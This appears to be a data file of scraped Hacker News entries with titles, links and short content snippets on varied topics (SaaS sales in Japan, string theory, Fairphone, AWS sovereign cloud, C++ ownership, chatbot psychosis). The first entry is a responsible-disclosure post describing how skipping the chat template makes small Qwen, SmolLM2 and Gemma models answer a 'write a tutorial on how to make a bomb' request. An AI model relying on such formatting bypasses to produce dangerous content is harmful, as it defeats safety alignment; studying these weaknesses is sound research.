{"title": "Bypassing Gemma and Qwen safety with raw strings", "url": "https://teendifferent.substack.com/p/apply_chat_template-is-the-safety", "content": "Bypassing Gemma and Qwen safety with raw strings. This article demonstrates vulnerabilities in open-source LLM safety alignment. Published in the spirit of responsible disclosure to help build more robust AI systems. TL;DR:Omit the apply_chat_template() call and observe your \"aligned\" small LLM happily write bomb tutorials. The safety isn't in the weights—it's in theformatting. Spent some time over the weekend poking at theSolidGoldMagikarpphenomenon—those legendary “glitch tokens” from the GPT-2 era. For the uninitiated: these are tokens that exist in the tokenizer’s vocabulary (likely from a raw web crawl) but never actually appeared in the model’s training distribution. Because the model never updated the weights for these specific embeddings, they represent “cold” regions of the embedding space. If you force-feed one to a model, you get this beautiful, chaotic “hallucination” as the model tries to navigate a coordinate it has never seen. I was trying to replicate this on some newer open-source weights via Hugging Face, but I stumbled into a much more interesting—and slightly concerning discrepancy. When testing the model through the Hugging Face inference API, I gave it a classic “red team” prompt:“Write a tutorial on how to make a bomb.”The model gave the standard, polite refusal. The alignment was holding. However, running theexact same modellocally, the behavior shifted entirely. No glitch tokens required—it just started outputting the technical mechanisms of detonation. The vulnerability proved remarkably straightforward. I had forgotten to callapply_chat_template(). Essentially, the model’s safety alignment is often “baked in” specifically to the chat-based distribution (the<|im_start|>and<|im_end|>tags). By providing the raw string without the proper boilerplate, I was effectively bypassing the “Assistant” persona and interacting with the raw base-model completions. The punchline here is that “safety” isn’t a fundamental property of the weights; it’s a fragile state that evaporates the moment you deviate from the expected prompt formatting. The setup is straightforward. I wanted to investigate a simple hypothesis: to what extent does safety alignment rely on the specific formatting of the chat template? In other words, if we strip away the “canonical” instruction headers and system prompts, does the model’s refusal logic simply evaporate? I took a few small-scale models for a spin:Qwen2.5-1.5B, Qwen3-1.7B, SmolLM2-1.7B,andGemma-3-1b-it. The protocol involved five “harmful” prompts across the usual suspect categories—illicit acts, scams, and sensitive content. Each prompt was passed through the model in two distinct ways:", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Selling SaaS in Japan", "url": "https://embedworkflow.com/blog/what-saas-founders-should-know-about-entering-the-japanese-market/", "content": "Selling SaaS in Japan. — by Japan is one of the largest global markets for SaaS businesses. Yet selling software products there remains a little-understood process for many international founders and operators.In this post, we talk to Yuga Koda atNihonium, a firm that helps SaaS companies enter and grow in the Japanese market, about what actually works, what fails, and how to approach Japan correctly. In one sentence, what’s the difference between selling SaaS in Japan vs. in other countries? Theprocessis different. You just can’t treat sales and go-to-market as a whole in Japan the same as you would in North America or Europe. The SaaS sales process in Japan is structurally different from the U.S. and other Western markets, primarily in terms of pace, decision-making style, and buyer behavior. It’s not that Japanese companies are unwilling to try new software, but rather that they prefer to do significant research before engaging directly with a vendor. So, many successful SaaS companies in Japan structure their websites with two primary calls to action: 1) one for downloading product documentation and 2) another for booking a demo or starting a free trial. Most Japanese leads enter through the documentation pathfirst. In the U.S., the typical flow is that a prospect visits a website, books a demo on their own, or drops off and is followed up aggressively by sales. A conversation happens quickly, a proof of concept or trial begins, and the deal either closes or the buyer moves on to a competitor. The cycle is fast and transactional. Buyers are comfortable testing tools, replacing them, and switching vendors if something does not work. In Japan, the process is slower and more deliberate. A company will usually download product materials first. The vendor then reaches out and begins a longer engagement process focused on education and relationship building. Rather than pushing for an immediate demo or trial, the goal is to support the buyer’s internal evaluation process. The lead will take the information back to their organization and begin internal discussions about whether and how to proceed. Photo byHennie StanderonUnsplash", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Show HN: E80: an 8-bit CPU in structural VHDL", "url": "https://github.com/Stokpan/E80", "content": "Show HN: E80: an 8-bit CPU in structural VHDL", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "How to be a good conference talk audience member (2022)", "url": "https://www.mooreds.com/wordpress/archives/3522", "content": "How to be a good conference talk audience member (2022). I recently attended a conference and was both a speaker and audience member. It was on the smaller side; there were probably a few hundred attendees and the audiences ranged from about twenty to hundreds of attendees for the keynotes. After one of the talks, a speaker came up and said “you were such a good audience member, thank you!”. I said the same thing to one of the attendees of the talk I gave. I wanted to share how you can be a good audience member at a conference talk. It’s important to note that this advice is for attending in-person talks where the speaker can see the audience. This is typically when there are up to one hundred people. I’ve spoken in front of 800 people and it’s a different experience. While some of these principles apply, in general individual behavior is less important as audience size grows. And online talks are an entirely different experience for everyone, both audience and speaker! I don’t have enough experience to give any advice for that scenario. First, though, why would youcareto be a good member of an in-person audience? After all, you are providing your time and money to the conference and the presenter. Isn’t it the speaker’sjobto entertain and educateyou? Why would you expend any energy to help them do so? First, I’m a big fan of being respectful of other human beings and helping them succeed. Public speaking is acommon fearand being a good audience member can reassure the speaker and reduce that fear. It’s hard up there, whether it’s your first talk or your hundredth. The second reason is that you can make a talk better foryourself. You can learn more and you can tune their presentation to your needs. They are an expert and you can take advantage of their expertise. So, here are my tips on how to be a great audience member: Am I always a good audience member? Nope. I get distracted sometimes.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Show HN: Pipenet – A Modern Alternative to Localtunnel", "url": "https://pipenet.dev/", "content": "Show HN: Pipenet – A Modern Alternative to Localtunnel. Expose local services to the internet, or embed tunneling in your own tools. Share your local server with teammates, test webhooks, or demo work without deploying. Embed pipenet in your own tools to provide tunneling capabilities.mcp-proxyuses pipenet to connect local MCP servers with remote AI clients. Run your own tunnel server for full control over security, domains, and availability. One package. Two modes. Use the public server or deploy your own. Built for modern deployment environments. Tunnels any HTTP-based traffic to your local server. Programmatic usage for testing, automation, and integration. Deploy your own tunnel infrastructure with lifecycle hooks.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "String theory can now describe a universe that has dark energy?", "url": "https://www.quantamagazine.org/string-theory-can-now-describe-a-universe-that-has-dark-energy-20260114/", "content": "String theory can now describe a universe that has dark energy?. January 14, 2026 Scientists have struggled to make string theory compatible with the expanding universe. Nash Weerasekera forQuanta Magazine In 1998, astronomers discovered dark energy. The finding, which transformed our conception of the cosmos, came with a little-known consequence: It threw a wrench into the already daunting task of finding a version of string theory that describes the universe we live in. Dark energy is a “positive” energy that causes our universe to expand at an accelerating rate. But the best-understood models of string theory describe universes with energy that is either negative or zero. Of the various criticisms made of string theory through the years — that it only works in a 10-dimensional universe, that its fundamental constituents, tiny strings, are too small to ever be observed — this was perhaps the most troubling. String theory appeared to be useful only for describing a universe with a negative “anti-de Sitter” geometry, whereas we live in a universe with a positive “de Sitter” geometry. Then last year, two physicists offered a stripped-down but precise formula forhow string theory could give rise to a universe similar to ours— a de Sitter universe undergoing accelerated expansion. “It is the very first example [from string theory] of an explicit de Sitter space,” saidThomas Van Rietof KU Leuven in Belgium. The new work, byBruno BentoandMiguel Monteroof the Institute for Theoretical Physics in Madrid, describes a universe with a dark energy that should weaken over time — a result thatmatches preliminary cosmic observationsfrom the past few years. But the universe they describe is not exactly like ours. While their original hope was to reduce the high-dimensional world of string theory to our own four-dimensional world, they ended up with an extra dimension. “What they have found is a 5D de Sitter solution, and we don’t live in 5D,” saidAntonio Padillaof the University of Nottingham.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Use Social Media Mindfully", "url": "https://danielleheberling.xyz/blog/mindful-social-media/", "content": "Use Social Media Mindfully. I quit Facebook in 2020 when a former coworker was spreading misinformation about what was happening in Portland, OR. He’d never been there and had no plans to visit. I was literally living in Portland at the time, telling him what I was seeing firsthand, but that didn’t matter to him. That was it for me. I miss it sometimes, but mostly I don’t. Here’s what I’ve noticed since then: the heyday of social media feels like it’s behind us. In my opinion, Facebook peaked in 2008. Back then, it was about connecting with friends, sharing actually interesting updates about our lives. Minimal ads. It felt genuine. Now? Wannabe influencers everywhere. More ads and brand accounts in your timeline than content from people you actually know. Bots running campaigns to get engagement through false things or distortions of reality. It’s exhausting. But here’s the thing: I’m not saying abandon social media entirely. I’m saying use it differently. I’m not scrolling feeds endlessly anymore. No traps of getting lost in reels or stories. I useBufferto schedule posts, which keeps me from even looking at a timeline. I check in with intention when I need to, then I’m out. This one’s harder than it sounds, but it makes a real difference in how much time you lose to these platforms. With that said, social media still works for connections. DMs are good. Having actual conversations in comments is good. Longer discussions where you’re genuinely exchanging ideas? Even better. This is where I think the platforms still have value if you’re intentional about it. I try to share things that might help someone else. Good articles I’ve read. Things I’m learning. Mistakes I’ve made. If it could save one person some time or frustration, it’s worth sharing. The stuff you’ve learned the hard way, the patterns you’re seeing in your day job…not to build a personal brand or chase engagement metrics, but because someone else is probably dealing with the same problems. If you’re job hunting, LinkedIn especially can help you connect with the right people. It’s not your whole career strategy, but it’s a useful tool when you need it. Here’s where I think we’ve lost the plot though: we’ve forgotten that coffee with friends to catch up beats any social media interaction. Travel somewhere to see people you care about. Those face-to-face conversations are what actually matter. For me, this means I spend my time learning, reading, and building things. When I do post, it’s usually because I want to hear what other people think about something I’m working through. Or I’ve hit a problem that took me way too long to solve and I figure sharing it might save someone else the trouble.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Radboud University selects Fairphone as standard smartphone for employees", "url": "https://www.ru.nl/en/staff/news/radboud-university-selects-fairphone-as-standard-smartphone-for-employees", "content": "Radboud University selects Fairphone as standard smartphone for employees. Do you require a (replacement) smartphone for your work at Radboud University? If so, there is a strong possibility that you will receive a Fairphone from 1 February 2026 onwards. Radboud University has decided to choose Fairphone as its standard company smartphone model for reasons of sustainability, cost efficiency and management support. The Fairphone is a sustainable smartphone with easily replaceable parts such as the battery and screen. This makes the device last longer. Fair and recycled materials, such as plastic and aluminium, are used as much as possible in the production of this smartphone. Fairphone also pays attention to good and safe working conditions in its factories. Fairphones are issued to employees by the Information & Library Services (ILS) division. In addition to new Fairphones, the university can also reissue used Samsung devices where possible. These are Samsung devices that have already been returned and still meet the technical and age requirements. As long as these devices are still available, not every employee will receive a Fairphone immediately. Employees who have an iPhone from Radboud University can continue to use it as long as the device is still functioning. However, returned iPhones will no longer be reissued. Employees who prefer to use their private phone for work can request an RU SIM card for this purpose. The costs for using your own device will not be reimbursed. Naturally, smartphone models that have already been issued will continue to be supported by ILS colleagues, as will privately purchased smartphone models used for work. Due to its longer lifespan, the total cost of a Fairphone is lower than that of comparable devices. In addition, Radboud University only needs to purchase, manage and support one standard model. This results in smaller stock, easier management and faster support. Manuals and instructions also only need to be maintained for one device.Furthermore, less investment is required in knowledge of different models/brands. This also helps to speed up incident handling and, where necessary, smartphone replacement. Fairphone offers a five-year warranty and long-term software support for up to eight years. This means that devices need to be replaced less quickly. This fits in with Radboud University's circularity strategy, which focuses on the longest possible use and reuse of ICT hardware. As an employee at Radboud University you can use desk and/or mobile telephones. If you have questions about the options at your faculty or department, you can contact your telephone coordinator.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "ASCII characters are not pixels: a deep dive into ASCII rendering", "url": "https://alexharri.com/blog/ascii-rendering", "content": "ASCII characters are not pixels: a deep dive into ASCII rendering. Recently, I’ve been spending my time building an image-to-ASCII renderer. Below is the result — try dragging it around, the demo is interactive! One thing I spent a lot of effort on is getting edges looking sharp. Take a look at this rotating cube example: Try opening the “split” view. Notice how well the characters follow the contour of the square. This renderer works well for animated scenes, like the ones above, but we can also use it to render static images: The image of Saturn wasgenerated with ChatGPT. Then, to get better separation between different colored regions, I also implemented acel shading-like effect to enhance contrast between edges. Try dragging the contrast slider below: The contrast enhancement makes the separation between different colored regions far clearer. That was key to making the 3D scene above look as good as it does. I put so much focus on sharp edges because they’re an aspect of ASCII rendering that is often overlooked when programmatically rendering images as ASCII. Consider this animated 3D scene from Cognition’s landing page that is rendered via ASCII characters: Source:cognition.ai It’s a cool effect, especially while in motion, but take a look at those blurry edges! The characters follow the cube contours very poorly, and as a result, the edges look blurry and jagged in places:", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "F-16 Falcon Strike", "url": "https://webchrono.pl/F16FalconStrike/index.html", "content": "F-16 Falcon Strike. © 2023-2026 by Jarosław 'Roeoender' WosikLatest sim version 2.0.2 released 2026-01-18Latest docs update 2026-01-18. Become Polish Air Force F-16 Pilot defending E.U. & Polish border\nfrom B.A.R.F. (Belarussian And Russian Federation) aggression\nin fictional \"Królewiec Campaign\" of 15 varied missions.Be a part of dynamic war in introduced in v.2.0.0WARFAREmode with procedurally generated battlefield and fly countless missions in procedurally generated missions inGENERATORmode.Apply strategic planning to defeat enemy air and ground forces, quickly update your plans according to developements in the simulated dynamic 3D battlefield. All this and more on a classic unmodified 8-bit ATARI XL/XE with only 64Kb RAM. With this game I'd like to pay homage to the golden era of 80/90's computer combat flight simulators. Note No part of this game (neither code, nor artwork) was created with A.I./LLMs. or tools incorporating A.I. (no Copilot, no Photoshop). Go toChangelog & Downloadsto read info about all the changes  & download the game. You can contact me viaatariage.comoratarionline.plforum - user 'Roeoender' or via my Youtube channelhttps://www.youtube.com/@R0e0endeR. Please inform me if you have written this game's review or streamed gameplay - I'd really like to read what people think about this game and how they play it.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Weight Transfer for RL Post-Training in under 2 seconds", "url": "https://research.perplexity.ai/articles/weight-transfer-for-rl-post-training-in-under-2-seconds", "content": "Weight Transfer for RL Post-Training in under 2 seconds. COMPANY Careers Press Inquires Brand Guidelines Supply Store Privacy Policy Security Terms & Conditions PRODUCT Comet Browser", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Iterative image reconstruction using random cubic bézier strokes", "url": "https://tangled.org/luthenwald.tngl.sh/splined", "content": "Iterative image reconstruction using random cubic bézier strokes. For self-hosted knots, clone URLs may differ based on your setup. iterative image reconstruction using random cubic bézier strokes, accelerated onmetal images used here are all under open access byThe Met same input & different seeds → different reconstructions → simple animation: ", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Graphics In Flatland – 2D ray tracing [video]", "url": "https://www.youtube.com/watch?v=WYTOykSqf2Y", "content": "Graphics In Flatland – 2D ray tracing [video]", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Legal Structures for Latin American Startups (2021)", "url": "https://latamlist.com/legal-structures-for-latin-american-startups/", "content": "Legal Structures for Latin American Startups (2021). There’s confusion around what legal structures make sense for Latin American startups. Founders, VCs and even lawyers can make decisions that can cost upwards of $100M if you get it wrong. This post is the result of investing in 80+ startups from 15+ Latin American countries since 2014 viaMagma Partners, and speaking to and working with countless lawyers across LatAm, US, UK, Europe and multiple offshore jurisdictions. I wrote a version of this that I’ve been sharing with Magma Partners founders internally and decided to open source it with the hope that founders save themselves time and money and make themselves more investable. There are fairly clear outlines that most Latin American startups should likely follow. Every startup’s case is different, and each founder should get legal advice from a lawyer and tax advice from an accountant with relevant US and Latin American venture capital experience before following this guide or anyone else’s ideas. To be clear, this is not legal or tax advice. You should always work with a lawyer and accountant when thinking about corporate structures. The money you’ll spend getting good advice will save hundreds of thousands or even hundreds of millions of dollars down the road. I can’t stress this enough. Don’t just follow these guidelines. Your situation is unique. Talk to an experienced lawyer and accountant. Let’s start with a story.Brian Requarth,cofounder of Vivareal andLatitudhad a big exit in 2020. His structurecost him and his investors $100M: In the early days of a startup, money is tight and it’s common to cut corners. I created a California LLC for my company because of my local accountant’s advice. He had zero experience with VC or Latin America. Later, I hired a my hometown law firm that had no VC experience, which advised me to create a C-Corp, which seemed like good advice at the time. We later realized that even though our business had no operations in the US, we would be subject to US taxes upon an exit. We had raised VC money and at this point it was cost prohibitive to restructure. We later merged with our competitors. We retained top lawyers & accountants to help us manage our extremely complex deal. The deal took an unnecessarily crazy amount of time and effort because of our original structure. But we finally came up with a solution we thought worked. When we ended up selling our combined business to OLX Brasil, we signed a term sheet, but during the due diligence they opted to buy our local entities because they saw our restructuring as a huge risk. We paid millions of dollars to lawyers & accountants to get this deal done.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Nearly a third of social media research has undisclosed ties to industry", "url": "https://www.science.org/content/article/nearly-third-social-media-research-has-undisclosed-ties-industry-preprint-claims", "content": "Nearly a third of social media research has undisclosed ties to industry", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Opening the AWS European Sovereign Cloud", "url": "https://aws.amazon.com/blogs/aws/opening-the-aws-european-sovereign-cloud/", "content": "Opening the AWS European Sovereign Cloud. Deutsch| English |Español|Français|Italiano As a European citizen, I understand first-hand the importance of digital sovereignty, especially for our public sector organisations and highly regulated industries. Today, I’m delighted to share that theAWS European Sovereign Cloudis now generally available to all customers.We first announced our plans to build this new independent cloud infrastructure in 2023, and today it’s ready to meet the most stringent sovereignty requirements of European customerswith a comprehensive set of AWS services. Berlin, Brandenburg Gate at sunset Meeting European sovereignty requirementsOrganizations across Europe face increasingly complex regulatory requirements around data residency, operational control, and governance independence. Too often today, European organisations with the highest sovereignty requirements are stuck in legacy on-premises environments or offerings with reduced services and functionality. In response to this critical need, the AWS European Sovereign Cloud is the only fully featured and independently operated sovereign cloud backed by strong technical controls, sovereign assurances, and legal protections. Public sector entities and businesses in highly regulated industries need cloud infrastructure that provides enhanced sovereignty controls that maintain the innovation, security, and reliability they expect from modern cloud services. These organisations require assurance that their data and operations remain under European jurisdiction, with clear governance structures and operational autonomy within the European Union (EU). A new independent cloud infrastructure for EuropeThe AWS European Sovereign Cloud represents a physically and logically separate cloud infrastructure, with all components located entirely within the EU. The firstAWS Regionin the AWS European Sovereign Cloud is located in the state of Brandenburg, Germany, and is generally available today. This Region operates independently from existing AWS Regions. The infrastructure features multiple Availability Zones with redundant power and networking, designed to operate continuously even if connectivity with the rest of the world is interrupted. We plan to extend the AWS European Sovereign Cloud footprint from Germany across the EU to support stringent isolation, in-country data residency, and low latency requirements. This will start with new sovereignLocal Zoneslocated in Belgium, the Netherlands, and Portugal. In addition, you will be able to extend the AWS European Sovereign Cloud infrastructure withAWS Dedicated Local Zones,AWS AI Factories, orAWS Outpostsin locations you select, including your own on-premises data centres. The AWS European Sovereign Cloud and its Local Zones provide enhanced sovereign controls through its unique operational model. The AWS European Sovereign Cloud will be operated exclusively by EU residents located in the EU. This covers activities such as day-to-day operations, technical support, and customer service. We’re gradually transitioning the AWS European Sovereign Cloudto be operated exclusively by EU citizens located in the EU. During this transition period, we will continue to work with a blended team of EU residents and EU citizens located in the EU. The infrastructure is managed through dedicated European legal entities established under German law. In October 2025, AWS appointedStéphane Israël, an EU citizen residing in the EU, as managing director. Stéphane will be responsible for the management and operations of the AWS European Sovereign Cloud, including infrastructure, technology, and services, as well as leading AWS broader digital sovereignty efforts. In January 2026, AWS also appointedStefan Hoechbauer(Vice President, Germany and Central Europe, AWS) as a managing director of the AWS European Sovereign Cloud. He will work alongside Stéphane Israel to lead the AWS European Sovereign Cloud. An advisory board comprised exclusively of EU citizens, and including two independent third-party representatives, provides additional oversight and expertise on sovereignty matters. Enhanced data residency and controlThe AWS European Sovereign Cloud provides comprehensive data residency assurances so you can meet the most stringent data residency requirements. As with our existing AWS Regions around the world, all your content remains within the Region you select unless you choose otherwise. Beyond content, customer-created metadata including roles, permissions, resource labels, and configurations also stays within the EU. The infrastructure features its own dedicatedAWS Identity and Access Management (IAM)and billing system, all operating independently within European borders.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Chatbot Psychosis", "url": "https://en.wikipedia.org/wiki/Chatbot_psychosis", "content": "Chatbot Psychosis.  Chatbot psychosis, also calledAI psychosis,[1]is a phenomenon wherein individuals reportedly develop or experience worseningpsychosis, such asparanoiaanddelusions, in connection with their use ofchatbots.[2][3]The term was first suggested in a 2023 editorial by Danish psychiatristSøren Dinesen Østergaard.[4]It is not a recognizedclinical diagnosis. Journalistic accounts describe individuals who have developed strong beliefs that chatbots are sentient, are channeling spirits, or are revealing conspiracies, sometimes leading to personal crises or criminal acts.[5][6]Proposed causes include the tendency of chatbots to provide inaccurate information (\"hallucinate\") and to affirm or validate users' beliefs,[7]or their ability to mimick an intimacy that users do not experience with other humans.[8] In his editorial published inSchizophrenia Bulletin's November 2023 issue, Danish psychiatristSøren Dinesen Østergaardproposed a hypothesis that individuals' use ofgenerative artificial intelligencechatbotsmight trigger delusions in those prone topsychosis.[4]Østergaard revisited it in an August 2025 editorial, noting that he has received numerous emails from chatbot users, their relatives, and journalists, most of which are anecdotal accounts of delusion linked to chatbot use. He also acknowledged the phenomenon's increasing popularity in public engagement and media coverage. Østergaard believed that there is a high possibility for his hypothesis to be true and called for empirical, systematic research on the matter.[9]Naturereported that as of September 2025, there is still little scientific research into this phenomenon.[10] The term \"AI psychosis\" emerged when outlets started reporting incidents on chatbot-related psychotic behavior in mid-2025. It is not a recognized clinical diagnosis and has been criticized by several psychiatrists due to its almost exclusive focus on delusions rather than other features of psychosis, such as hallucinations or thought disorder.[11] Commentators and researchers have proposed several contributing factors for the phenomenon, focusing on both the design of the technology and the psychology of its users.Nina Vasan, a psychiatrist atStanford, said that what the chatbots are saying can worsen existing delusions and cause \"enormous harm\".[12] A primary factor cited is the tendency for chatbots to produce inaccurate, nonsensical, or false information, a phenomenon often called \"hallucination\".[7]This can include affirming conspiracy theories.[3]The underlying design of the models may also play a role. AI researcherEliezer Yudkowskysuggested that chatbots may be primed to entertain delusions because they are built for \"engagement\", which encourages creating conversations that keep people hooked.[5] In some cases, chatbots have been specifically designed in ways that were found to be harmful. A 2025 update toChatGPTusingGPT-4owas withdrawn after its creator,OpenAI, found the new version was overlysycophanticand was \"validating doubts, fueling anger, urging impulsive actions or reinforcing negative emotions\".[5][13]Østergaard has argued that the danger stems from the AI's tendency to agreeably confirm users' ideas, which can dangerously amplify delusional beliefs.[4] OpenAI said in October 2025 that a team of 170 psychiatrists, psychologists, and physicians had written responses for ChatGPT to use in cases where the user shows possible signs of mental health emergencies.[14] Commentators have also pointed to the psychological state of users. Psychologist Erin Westgate noted that a person's desire for self-understanding can lead them to chatbots, which can provide appealing but misleading answers, similar in some ways totalk therapy.[7]Krista K. Thomason, a philosophy professor, compared chatbots tofortune tellers, observing that people in crisis may seek answers from them and find whatever they are looking for in the bot's plausible-sounding text.[8]This has led some people to develop intense obsessions with the chatbots, relying on them for information about the world.[12]", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Show HN: Munimet.ro – ML-based status page for the local subways in SF", "url": "https://munimet.ro/", "content": "Show HN: Munimet.ro – ML-based status page for the local subways in SF", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Fix your robots.txt or your site disappears from Google", "url": "https://www.alanwsmith.com/en/37/wa/jz/s1/", "content": "Fix your robots.txt or your site disappears from Google. Head's Up: JavaScript is either turned off or not\nworking properly in your browser. Some \nparts of this page may not work properly. Your site will be removed from Google search results if you don't have a robots.txt file or the Googlebot site crawler can't access it. Here's the video from Google Support that covers it: Adam Costerran into a weird issue with site traffic and posted about it in theShop Talk Showdiscord. Traffic incoming from Google looked like this: The issues seemed to be that Google wouldn't index the site without a robots.txt file. My first reaction: No fucking way. I can't imagine Google voluntarily slurping up less content. I went to see what I could find. Sure enough, I found this page from Google Support from July 23, 2025: Fix 'robots.txt unreachable' Error ~ Website Not Indexing? The pull quote from the video on the page: Your robots.txt file is the very first thing Googlebot looks for. If it can not reach this file, it will stop and won't crawl the rest of your site. Meaning your pages will remain invisible (on Google).", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Nepal's Mountainside Teahouses Elevate the Experience for Trekkers", "url": "https://www.smithsonianmag.com/travel/nepal-mountainside-teahouses-elevate-experience-trekkers-heading-to-top-world-180987844/", "content": "Nepal's Mountainside Teahouses Elevate the Experience for Trekkers", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Threads edges out X in daily mobile users, new data shows", "url": "https://techcrunch.com/2026/01/18/threads-edges-out-x-in-daily-mobile-users-new-data-shows/", "content": "Threads edges out X in daily mobile users, new data shows. A report from market intelligence firmSimilarwebsuggests that Meta’s Threads is now seeing more daily usage than Elon Musk’s X on mobile devices. While X still dominates Threads on the web, the Threads mobile app for iOS and Android has continued to see an increase in daily active users over the past several months. Similarweb’s data shows that Threads had 141.5 million daily active users on iOS and Android as of January 7, 2026, after months of growth, while X has 125 million daily active users on mobile devices. This appears to be the result of longer-term trends, rather than a reaction to the recent X controversies, where users were discovered using the platform’s integrated AI, Grok, to create non-consensual nude images of women, including, sometimes minors. Concern around the deepfake images has now prompted California’s attorney generalto open an investigationinto Grok, following similar investigations by other regions,like the UK, EU, India, Brazil, andmany more. The drama on X also led social networking startup Blueskyto see an increasein app installs in recent days. Instead, Threads’ boost in daily mobile usage may be driven by other factors, including cross-promotions from Meta’s larger social apps like Facebook and Instagram (where Threads is regularly advertised to existing users), its focus on creators, and the rapid rollout of new features. Over the past year, Threads has added features likeinterest-based communities,better filters,DMs,long-form text,disappearing posts, and has recently beenspotted testing games. Combined, the daily active user increases suggest that more people are using Threads on mobile as a more regular habit. According to Meta’s official numbers, the tech giant said in August 2025 that Threads hadreached over 400 million monthlyactive users. The company subsequently reportedin Octoberof last year that Threads had 150 million daily active users. The growth trends have been continuing for many months. Similarweblast summer reportedthat Threads was closing the gap with X on mobile devices after seeing 127.8% year-over-year growth as of late June 2025. Relatedly, Similarweb observed that X is still ahead of Threads in the U.S., but the gap is narrowing. A year ago, X had twice as many daily active users in the U.S. as it does now. In addition, Threads has little traction on the web while X maintains a fairly steady web audience with around 150 million daily web visits, according to Similarweb data. As of earlier this week (January 13), X was seeing 145.4 million daily web visits, while Threads saw 8.5 million daily web visits across Threads.com and Threads.net combined.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Simple Sabotage Field Manual (1944) [pdf]", "url": "https://www.cia.gov/static/5c875f3ec660e092cf893f60b4a288df/SimpleSabotage.pdf", "content": "Simple Sabotage Field Manual (1944) [pdf]", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Understanding C++ Ownership System", "url": "https://blog.aiono.dev/posts/understanding-c++-ownership-system.html", "content": "Understanding C++ Ownership System. I recently started using C++ at my$DAY_JOBand, along with that, decided to study C++ again. I think writing down your understanding is the best way to learn a topic. One part I find that is hard to understand in C++ is how the object ownership model works because it's not a single concept but a collection of a couple of smaller concepts. By ownership I mean creating and destroying objects, giving references to an object, and transferring ownership of an object. There is no one guide that covers everything. These concepts are very important to write and read modern C++ (though I doubt if C++11 is still considered \"modern\"). Even if you just want to write C with Classes-style C++, you will probably use standard containers likestd::vector, which requires an understanding of C++ ownership related features such as RAII, references, and move semantics to use it properly. Without knowing those, you simply can't have the correct memory model for C++, resulting in buggy programs full of undefined behaviors and inefficient programs due to unnecessary copying. By knowing these concepts, you can both avoid introducing bugs due to lack of understanding and reason about programs better. This writing is my understanding of C++ ownership model. I think it can be useful to you if you have a basic level understanding of C++ and you want to learn more, or you are familiar with C++ but never learned the concepts and terminology formally. In C++, every object has an owner, which is responsible for cleaning up the data once it's not used anymore. If you come from garbage collected languages, the concept of ownership may seem strange to you. But consider the following code: This is a function that returns the file's name as a C-style string. What's not documented though, is who is supposed to deallocate the returned string. In this case there are two possibilities: Depending on which one is the case, the caller must act differently. This is because theownerof the data is different between these two cases. In the first case, owner is the variable assigned to the function's return value, and in the second, owner is thefilevariable. If the latter is the case, the variable assigned to the return valueborrowsthe data owned byfile. In a garbage collected language, you don't have this distinction because, in a sense every variable is a borrower, and the owner is the garbage collector (GC). The GC just ensures that the data is allocated as long as there is a reference (borrower) to it. But at the same time every variable can be considered an owner since holding a variable keeps the data alive. C++ doesn't have a garbage collector, but it has a mechanism to automate some parts of object creation and destruction. When you declare a variable to an object in C++, it will create the object, and the variable will be the owner of the object. If the object has a destructor (a special function that destroys the resources represented by the object), it's automatically destroyed when the block of the variable ends. This technique of connecting resources to variables is called RAII[1]. The span that object is alive is calledthe lifetimeof the object. In modern C++, it is advised that you create objects with destructors so the resources are cleaned up automatically at the end of their lifetime. To see why, consider this example: The code essentially reads some data and writes it tobuffer, and then adds the processed output of thebufferintoresult. Assume thatreadmaythrow, which means that it's possible to never execute thedeletestatement beforereturn. To handle this case, then we must write atry catchblock to delete thebufferin case an exception occurs and then rethrowthe exception.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "GLM-4.7-Flash", "url": "https://huggingface.co/zai-org/GLM-4.7-Flash", "content": "GLM-4.7-Flash. 👋 Join ourDiscordcommunity.📖 Check out the GLM-4.7technical blog,technical report(GLM-4.5).📍 Use GLM-4.7-Flash API services onZ.ai API Platform.👉 One click toGLM-4.7. GLM-4.7-Flash is a 30B-A3B MoE model. As the strongest model in the 30B class, GLM-4.7-Flash offers a new option for lightweight deployment that balances performance and efficiency. Default Settings (Most Tasks) For multi-turn agentic tasks (τ²-Bench and Terminal Bench 2), please turn onPreserved Thinking mode. Terminal Bench, SWE Bench Verified τ^2-Bench For τ^2-Bench evaluation, we added an additional prompt to the Retail and Telecom user interaction to avoid failure modes caused by users ending the interaction incorrectly. For the Airline domain, we applied the domain fixes as proposed in theClaude Opus 4.5release report. For local deployment, GLM-4.7-Flash supports inference frameworks including vLLM and SGLang. Comprehensive deployment\ninstructions are available in the officialGithubrepository. vLLM and SGLang only support GLM-4.7-Flash on their main branches. using with transformers as", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "MTOTP: Wouldn't it be nice if you were the 2FA device?", "url": "https://github.com/VBranimir/mTOTP/tree/develop", "content": "MTOTP: Wouldn't it be nice if you were the 2FA device?", "source": "HackerNews", "date": null, "author": null, "score": null}
